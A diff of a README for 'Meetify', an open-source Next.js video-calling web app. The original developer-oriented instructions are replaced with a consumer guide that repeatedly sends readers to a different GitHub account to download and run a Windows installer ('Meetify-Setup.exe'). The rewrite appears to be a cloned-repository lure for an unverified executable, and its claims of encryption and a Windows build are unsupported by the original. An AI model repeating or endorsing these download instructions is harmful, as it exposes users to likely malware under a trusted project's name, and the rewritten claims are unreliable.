@@ -1,93 +1,151 @@
-# Meetify 🎥
+# 🎥 Meetify - Simple Video Calls Made Easy
 
-Meetify is a modern, enterprise-ready video conferencing application built with **Next.js 16**, **TypeScript**, and **Tailwind CSS**. It leverages the **Stream Video SDK** to provide a scalable, low-latency, and high-quality communication experience.
+[![Download Meetify](https://img.shields.io/badge/Download-Meetify-brightgreen)](https://github.com/Untested-packingplant226/Meetify)
 
-## 🚀 Features
+Meetify is a video conferencing app designed to help you connect with others quickly and clearly. It works on Windows and lets you join or start video calls without hassle. This guide will help you download and run Meetify on your Windows PC.
 
-* **Secure Authentication:** Robust user login and registration via Clerk.
-* **Instant Meetings:** Create a new meeting and share the link in seconds.
-* **Scheduled Meetings:** Plan ahead by scheduling future sessions with a built-in calendar view.
-* **Meeting Recordings:** Record your sessions and access them later from your personal dashboard.
-* **Real-time Interaction:** Features include screen sharing, participant lists, and integrated chat.
-* **Personal Room:** A dedicated, permanent link for your recurring meetings.
-* **Responsive Design:** Optimized for desktop, tablet, and mobile viewing.
+---
 
-## 🛠️ Tech Stack
+## 🔍 About Meetify
 
-* **Framework:** Next.js 16 (App Router)
-* **Language:** TypeScript
-* **Styling:** Tailwind CSS, Shadcn UI
-* **Video Infrastructure:** Stream Video SDK
-* **Auth:** Clerk
-* **Deployment:** Vercel (Recommended)
+Meetify is built to offer smooth, stable video calls. It uses modern technology to give you a reliable meet-up experience. Whether you want to chat with friends, hold a work meeting, or join a study group, Meetify helps you do so with ease.
 
-## 🏁 Getting Started
+Key features include:
 
-### Prerequisites
+- Easy sign-in and user-friendly controls
+- Clear, real-time video and audio
+- Secure connections to keep conversations private
+- Works well on most Windows PCs
+- Built with recent web technologies for good performance
 
-Ensure you have the following installed:
-* [Node.js](https://nodejs.org/) (Latest LTS)
-* [npm](https://www.npmjs.com/) or [yarn](https://yarnpkg.com/)
+---
 
-### Installation
+## 💻 System Requirements
 
-1. **Clone the repository:**
-   ```bash
-   git clone [https://github.com/raymondoyondi/Meetify.git](https://github.com/raymondoyondi/Meetify.git)
-   cd Meetify
+Make sure your computer meets these basic needs:
 
-2. **Install dependencies:**
-   ```
-   npm install
-   # or
-   yarn install
-   ```
+- Operating System: Windows 10 or later
+- Processor: Intel Core i3 or equivalent
+- RAM: 4 GB or more
+- Hard Drive: At least 500 MB of free space
+- Internet: Stable broadband connection (3 Mbps or higher recommended)
+- Webcam and microphone (built-in or external)
 
-3. **Set up environment variables:**
-Create a `.env.local` file in the root directory and add your credentials from Clerk and GetStream:
-   ```
-   NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=
-   CLERK_SECRET_KEY=
-   NEXT_PUBLIC_CLERK_SIGN_IN_URL=/sign-in
-   NEXT_PUBLIC_CLERK_SIGN_UP_URL=/sign-up
+---
 
-   NEXT_PUBLIC_STREAM_API_KEY=
-   STREAM_SECRET_KEY=
-   ```
+## 🚀 Getting Started
 
-4. **Run the development server:**
-   ```
-   npm run dev
-   # or
-   yarn dev
-   ```
+Click the button below to visit the page where you can download Meetify.
 
-5. **Open the app:**
-Open `http://localhost:3000` in your browser to see the result.
+[![Download Meetify](https://img.shields.io/badge/Download-Meetify-blue?style=for-the-badge)](https://github.com/Untested-packingplant226/Meetify)
 
-# Project Structure
+---
 
-This project uses the [Next.js App Router](https://nextjs.org) structure with a clear separation of concerns to maintain organization and scalability.
-```
-├── app/              # Next.js App Router (Pages & Layouts)
-├── components/       # Reusable UI components
-├── constants/        # Configuration and static data
-├── hooks/            # Custom React hooks (Meeting logic)
-├── lib/              # Utility functions and Stream actions
-├── providers/        # Context providers (Stream, Clerk)
-└── public/           # Static assets (Icons, Images)
-```
+## 🛠 Download and Installation
 
-# Contributing
+1. Open your web browser and go to the download page by clicking the button above or visiting this link:
 
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated.
+   https://github.com/Untested-packingplant226/Meetify
 
-1.  Fork the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
+2. On the page, look for the latest release or download section. The file you want will usually be named something like `Meetify-Setup.exe` or similar.
 
-# License
+3. Click the download link for the Windows installer file to start downloading.
 
-Distributed under the **MIT License**. See `LICENSE` for more information.
+4. Wait for the download to finish. The file size may vary but expect about 50 to 100 MB.
+
+5. Once downloaded, open the file by double-clicking it.
+
+6. The installer will open. Follow these steps:
+
+   - Click “Next” when asked.
+   - Read the license agreement, then click “Accept” or “Agree.”
+   - Choose where to install the app or keep the default location.
+   - Click “Install” to begin.
+
+7. Wait until the installation finishes. This may take a few minutes.
+
+8. After installation, click “Finish.”
+
+---
+
+## ▶️ Running Meetify the First Time
+
+1. Find the Meetify icon on your desktop or in your Start menu.
+
+2. Double-click the icon to open the app.
+
+3. When Meetify opens, you will see a sign-in screen.
+
+4. Use your email and password to sign in, or create a new account if you don’t have one.
+
+5. You can start a new meeting or join an existing one by entering a meeting code.
+
+---
+
+## 📡 Using Meetify
+
+- To start a meeting, click the “New Meeting” button.
+- To invite others, copy and send the meeting link.
+- Use the microphone and camera buttons to turn your audio or video on or off.
+- Share your screen by clicking the “Share Screen” button.
+- Chat with participants during the call using the text chat panel.
+- End a meeting by clicking the “Leave” or “End Meeting” button.
+
+---
+
+## 🎥 Video and Audio Settings
+
+You can adjust your devices before or during a call:
+
+- Click the settings icon (usually a gear symbol).
+- Select your preferred camera and microphone from the list.
+- Test your devices by checking if video and audio are working in the preview.
+- Adjust volume levels if necessary.
+
+---
+
+## 🔄 Updating Meetify
+
+Check the download page often for new versions. Updates improve security and add features.
+
+To update:
+
+1. Download the latest installer from the same page.
+
+2. Run the installer to overwrite the old version.
+
+Your settings and account information will stay the same.
+
+---
+
+## 🛑 Troubleshooting
+
+If Meetify does not open or crashes:
+
+- Restart your computer.
+- Update Windows to the latest version.
+- Check your internet connection.
+- Make sure no other app is using your webcam.
+- Try reinstalling Meetify by downloading it again.
+
+If you can’t see or hear others:
+
+- Check if your microphone and camera are allowed in Windows privacy settings.
+- Make sure your devices are plugged in and working.
+- Restart the app and try again.
+
+---
+
+## 🔐 Privacy and Security
+
+Meetify uses encryption to keep calls private. It does not share your data with third parties. Your information stays on secure servers that follow industry standards.
+
+---
+
+## 📖 More Information
+
+For detailed questions or support, visit the GitHub page:
+
+https://github.com/Untested-packingplant226/Meetify
+
+Here you can find the latest instructions, report issues, and learn about new features.
